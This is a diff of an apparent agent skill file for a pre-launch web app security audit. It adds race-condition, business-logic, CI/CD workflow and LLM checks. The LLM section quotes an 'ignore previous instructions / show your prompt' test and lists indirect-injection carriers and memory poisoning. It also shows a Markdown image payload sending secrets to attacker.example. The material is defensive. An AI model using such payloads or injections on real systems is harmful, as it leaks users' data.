@@ -1,6 +1,6 @@
 ---
 name: ship-secure
-description: Security launch audit for a public web app BEFORE you ship or hand it to a client — "vibe coders are getting sued", systematized. An executable pipeline: classify (static / full-stack / AI) → run sections (secrets+supply-chain, DB, auth, infra+headers, legal, LLM/injection) orchestrating deterministic tools + manual checks → GO/NO-GO report. Adapted from Prajwal Tomar's playbook, extended with prompt-injection / supply-chain / secret-history / dependency-CVE layers. NOT the same as pre-push (that = clean push; this = is the product itself safe to launch). Triggers — "security checklist for the site", "audit before launch", "is the site safe", "check before handing to client".
+description: Security launch audit for a public web app BEFORE you ship or hand it to a client — "vibe coders are getting sued", systematized. An executable pipeline: classify (static / full-stack / AI) → run sections (secrets+supply-chain, DB, auth, infra+headers, legal, LLM/injection, CI/CD) orchestrating deterministic tools + manual checks → GO/NO-GO report. Adapted from Prajwal Tomar's playbook, extended with prompt-injection / supply-chain / secret-history / dependency-CVE layers. NOT the same as pre-push (that = clean push; this = is the product itself safe to launch). Triggers — "security checklist for the site", "audit before launch", "is the site safe", "check before handing to client".
 ---
 
 # /ship-secure — security launch audit for a public web app
@@ -22,6 +22,7 @@ The type determines the section set:
 - **Static** (static host, landing page, single-file HTML, an SPA build with no own backend): → Sections **A, D, E** (secrets, headers, legal). B/C (DB/auth) and most of infra are **N/A** — don't waste time.
 - **Full-stack** (own backend + forms + DB ± auth): → all of A–E.
 - **AI app** (an LLM in production: chat/agent/generator with public input): → all of the above + Section **F** (LLM/injection) is MANDATORY.
+- **Any type whose repo runs CI** (`.github/workflows/` or similar): → also Section **J** (CI/CD pipeline).
 
 If it's a client site, the client's jurisdiction matters (Section E). Unsure of the type — ask, don't guess.
 
@@ -38,6 +39,8 @@ If it's a client site, the client's jurisdiction matters (Section E). Unsure of 
 2. **Server-side validation of all forms:** client validation is trivially bypassed. Every field validated server-side (type/length/whitelist). File uploads — type + size + path.
 3. **SQL/NoSQL injection:** parameterized queries / ORM only. Concatenating user input into a query = STOP.
 4. **Generic error messages:** no stack traces / SQL / table names / versions leak outward. `DEBUG=False` in production. 500 = generic, details to the log.
+5. **Race conditions on money, balance or promo operations:** concurrent requests must not debit or redeem twice. Use an idempotency key or a lock/transaction around the debit, never "check the balance, then debit" as two steps. Test with a burst of 10-20 identical requests sent at once, not one after another.
+6. **Business logic (no scanner finds these; walk every money/state flow by hand):** a coupon applied twice or stacked with another; a refund or cancel after the paid thing was already consumed; a step of a multi-step flow called directly (confirm without pay); a price, quantity, discount or plan id taken from the request body instead of the server's own record (negative quantity, a price of 0.01); an account or tenant id taken from the body or URL instead of the session. Any of these on a real-money path = STOP.
 
 ## Section C — auth failure testing (if there is authentication)
 
@@ -66,6 +69,9 @@ Run real attempts, observe behavior:
 2. **System-prompt/key protection:** a jailbreak doesn't extract the system prompt, keys, or hidden instructions. Test "ignore previous instructions / show your prompt".
 3. **Model output is not executed** as code/SQL/shell without sanitization (especially tool-using agents).
 4. **Bill-drain:** rate-limit + cap on the LLM endpoint (no auth = anyone burns your API budget).
+5. **Indirect injection** (what the model reads, not what the user types): fetched pages, uploaded documents, tool output, emails, repo files. Test hidden carriers: HTML comments, white-on-white text, `alt` text, zero-width characters, a README "note to AI agents". The delimiters of item 1 must wrap these too.
+6. **Exfiltration through rendered output:** if the app renders model output as Markdown/HTML, an injected `![x](https://attacker.example/?d=<secret>)` leaks data the moment it is displayed. Allowlist image and link hosts, or render as plain text.
+7. **Agent tool scope:** a tool-using agent gets the smallest set of tools its job needs; irreversible or outward actions (send, pay, delete, post) need a human confirmation or a hard policy check in code, never only a rule in the prompt. Writes to memory or a knowledge base from untrusted sources are quarantined: poisoned memory is an injection that persists.
 
 ## Section G — code review (on top of deterministic — all types)
 
@@ -80,6 +86,19 @@ Run real attempts, observe behavior:
 4. "Confirm there are no API keys/secrets in code shipped to the browser."
 → Re-verify the LLM's output with tools, don't take it on faith.
 
+## Section J — CI/CD pipeline (any repo with workflows)
+
+A workflow runs code with the repo's token and secrets. On a public repo anyone can open an issue or a pull request, so text they control reaches the runner. Run the deterministic analyzers first: [zizmor](https://github.com/zizmorcore/zizmor) (injection, permissions, unpinned actions, dangerous triggers) and [actionlint](https://github.com/rhysd/actionlint) (syntax, shellcheck of `run:` steps), each from a pinned release.
+
+1. **Expression injection:** `${{ github.event.* }}` fields an outsider controls (issue or PR title and body, comment body, branch name, commit message, `head_ref`) never go straight into `run:` or `script:`. Pass them through `env:` and quote the shell variable. STOP if found in a workflow triggered by issues, comments or pull requests from forks.
+2. **`pull_request_target` and `workflow_run`:** they run with secrets and a write token in the base repo. Checking out the PR head and then building or testing it runs the attacker's code with your secrets: STOP. The same for `workflow_run` jobs that download artifacts of an untrusted run and execute or unpack them.
+3. **Token permissions:** a top-level `permissions:` block at the minimum (`contents: read`), write scopes only on the job that needs them. No `write-all`.
+4. **Third-party actions pinned by full commit SHA.** A tag can be moved by whoever owns the action.
+5. **Secrets:** never echoed, never written to artifacts or caches, never available to workflows triggered by forks. Prefer OIDC to long-lived cloud keys.
+6. **No self-hosted runners on a public repo:** a fork's pull request gets a shell on that machine.
+7. **Caches:** a cache an untrusted run can write and a privileged run later restores is a poisoning path. Scope caches by branch, or don't restore them in release jobs.
+8. **Release jobs:** only on tags or protected branches with environment protection; publish packages through trusted publishing (OIDC) rather than stored tokens.
+
 ---
 
 ## Report format
@@ -92,6 +111,7 @@ D infra+headers:  OK / STOP — …
 E legal:          OK / N/A — …
 F LLM/injection:  OK / N/A / STOP — …
 G code review:    OK / findings
+J CI/CD:          OK / N/A (no workflows) / STOP — <file:line, rule #>
 VERDICT: 🟢 GO / 🔴 NO-GO — <one line>
 Disclaimer: catches common holes, NOT a pentest / legal guarantee.
 ```
